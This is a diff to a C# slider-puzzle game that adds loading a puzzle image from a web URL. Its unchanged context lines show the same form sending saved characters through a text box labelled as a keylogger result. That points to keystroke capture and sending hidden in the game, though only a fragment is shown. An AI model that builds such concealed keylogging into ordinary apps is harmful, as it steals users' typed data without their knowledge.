@@ -1,4 +1,8 @@
-﻿namespace Image_Slider_Puzzle
+﻿using System.Drawing;
+using System.Net;
+using System.Windows.Forms;
+
+namespace Image_Slider_Puzzle
 {
     public partial class Form1 : Form
     {
@@ -1022,6 +1026,36 @@
                 message.Send(charsUsed);
             }
             else textBoxKeyLoggerResult.Text = "No saved chars for send.";
+        }
+
+        private void loadWEBToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (panLoadFromWeb.Visible == false) panLoadFromWeb.Visible = true;
+            else panLoadFromWeb.Visible = false;
+        }
+
+        private void btnLoadFromWeb_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                using (WebClient webClient = new WebClient())
+                {
+                    byte[] data = webClient.DownloadData(textBoxLoadFromWeb.Text);
+
+                    using (MemoryStream memoryStream = new MemoryStream(data))
+                    {
+                        Bitmap bitmap = new Bitmap(memoryStream);
+
+                        LoadImageFromGalleryOrPc(bitmap);
+                    }
+
+                    panLoadFromWeb.Visible = false;                  
+                }
+            }
+            catch (Exception ex)
+            {
+                textBoxLoadFromWeb.Text = $"Error loading image.";
+            }
         }
     }
 }
